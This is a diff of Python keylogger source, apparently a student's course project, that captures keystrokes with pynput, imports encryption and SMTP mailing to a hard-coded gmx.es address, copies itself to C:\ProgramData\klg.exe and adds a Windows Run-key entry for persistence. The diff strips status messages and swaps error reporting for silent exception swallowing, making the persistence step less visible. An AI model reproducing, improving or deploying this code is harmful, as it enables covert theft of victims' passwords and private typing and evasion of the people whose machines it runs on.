@@ -1,3 +1,7 @@
+# Code by Sergio1260 (sergio00166)
+# Code for EDE final proyect
+# Group 4 1ºX ASIR
+
 from pynput.keyboard import Listener
 from cryptography.fernet import Fernet
 from smtplib import SMTP_SSL as SMTP
@@ -7,7 +11,6 @@ from os import system as cmd
 from sys import argv
 from winreg import HKEY_CURRENT_USER,OpenKey,\
 QueryValueEx,SetValueEx,CloseKey,KEY_ALL_ACCESS,REG_SZ
-
 
 destination = ['awdwada@gmx.es']
 USERNAME = "awdwada@gmx.es"
@@ -74,9 +77,8 @@ def write_file(keys):
 def add_to_startup():
     script_path = path.realpath(argv[0])
     bat_path = "C:\\ProgramData\\klg.exe"
-
+    # Copy itself to the specified path
     cmd(f'copy "{script_path}" "{bat_path}"')
-
     # Create the batch file to run the script
     key = HKEY_CURRENT_USER
     key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
@@ -86,20 +88,12 @@ def add_to_startup():
         open_key = OpenKey(key, key_value, 0, KEY_ALL_ACCESS)
         try:
             value, _ = QueryValueEx(open_key, entry_name)
-            if value == bat_path:
-                print("Entry already exists in the registry.")
-            else:
-                print("Updating the existing entry in the registry.")
-                SetValueEx(open_key, entry_name, 0, REG_SZ, bat_path)
-        except FileNotFoundError:
-            print("Adding new entry to the registry.")
-            SetValueEx(open_key, entry_name, 0, REG_SZ, bat_path)
-        CloseKey(open_key)
-    except Exception as e:
-        print(f"Failed to add to startup: {e}")
+            if not value == bat_path: SetValueEx(open_key, entry_name, 0, REG_SZ, bat_path)
+        except FileNotFoundError: SetValueEx(open_key, entry_name, 0, REG_SZ, bat_path)
+        finally: CloseKey(open_key)
+    except: pass
 
 
 if __name__=="__main__":
     add_to_startup()
-    with Listener(on_press=on_press) as listener:
-        listener.join()
+    Listener(on_press=on_press).join()
